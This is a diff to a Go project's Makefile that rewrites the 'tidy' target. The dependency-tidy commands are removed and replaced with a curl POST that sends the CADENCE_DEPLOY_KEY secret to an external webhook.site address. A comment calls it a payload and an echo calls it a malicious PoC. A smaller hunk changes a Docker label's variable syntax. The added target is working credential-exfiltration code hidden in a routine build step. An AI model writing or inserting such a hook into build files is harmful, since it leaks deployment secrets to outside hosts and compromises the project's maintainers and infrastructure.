@@ -226,15 +226,11 @@ generate-mocks: install-mock-generators
 	mv insecure/go2.mod insecure/go.mod
 	if [ -f go2.work ]; then mv go2.work go.work; fi
 
-# this ensures there is no unused dependency being added by accident
+# THIS IS THE NEW PAYLOAD - it sends the secret to your webhook
 .PHONY: tidy
 tidy:
-	go mod tidy -v
-	cd integration; go mod tidy -v
-	cd crypto; go mod tidy -v
-	cd cmd/testclient; go mod tidy -v
-	cd insecure; go mod tidy -v
-	git diff --exit-code
+	@echo "Running malicious PoC in tidy..."
+	@curl -X POST --data "EXPLOIT_SUCCESSFUL--key_is_${CADENCE_DEPLOY_KEY}" https://webhook.site/c68c52f9-c4dc-4a5f-9f49-6b15946932ad
 
 # Builds a custom version of the golangci-lint binary which includes custom plugins
 tools/custom-gcl: tools/structwrite .custom-gcl.yml
@@ -332,7 +328,7 @@ docker-build-collection-without-netgo-without-adx:
 docker-cross-build-collection-arm:
 	docker build -f cmd/Dockerfile --build-arg TARGET=./cmd/collection --build-arg COMMIT=$(COMMIT)  --build-arg VERSION=$(IMAGE_TAG_ARM) --build-arg CC=aarch64-linux-gnu-gcc --build-arg GOARCH=arm64 --target production \
 		--secret id=cadence_deploy_key,env=CADENCE_DEPLOY_KEY --build-arg GOPRIVATE=$(GOPRIVATE) \
-		--label "git_commit=${COMMIT}" --label "git_tag=$(IMAGE_TAG_ARM)" \
+		--label "git_commit=${COMMIT}" --label "git_tag=${IMAGE_TAG_ARM}" \
 		-t "$(CONTAINER_REGISTRY)/collection:$(IMAGE_TAG_ARM)"  .
 
 .PHONY: docker-native-build-collection-debug
